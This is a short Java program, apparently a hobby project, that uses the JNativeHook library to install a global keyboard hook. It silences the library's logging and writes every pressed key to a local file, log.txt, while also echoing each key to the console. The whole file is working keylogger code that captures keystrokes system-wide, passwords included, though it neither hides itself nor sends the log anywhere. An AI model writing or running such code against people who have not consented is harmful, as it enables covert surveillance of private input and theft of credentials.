package main;

import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;


public class Main implements NativeKeyListener {
    private static FileWriter writer;
    
	public static void main(String[] args) {
		String text = "Input";
		
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {			
			e.printStackTrace();
		}
			GlobalScreen.addNativeKeyListener(new Main());
			// Get the logger for "org.jnativehook" and set the level to off.
			Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
			logger.setLevel(Level.OFF);

			// Don't forget to disable the parent handlers.
			logger.setUseParentHandlers(false);
			
			
			// FileWriter w;
				try {
					writer = new FileWriter("log.txt");

				} catch (IOException e1) {
					System.out.println("Problem bei FileWriter");
				} 
			
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
	    String text = NativeKeyEvent.getKeyText(e.getKeyCode());
		System.out.println("Pressed: " + text );
		try {
			writer.write(text);
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			writer.flush();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
	}
	
	

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		//System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

}
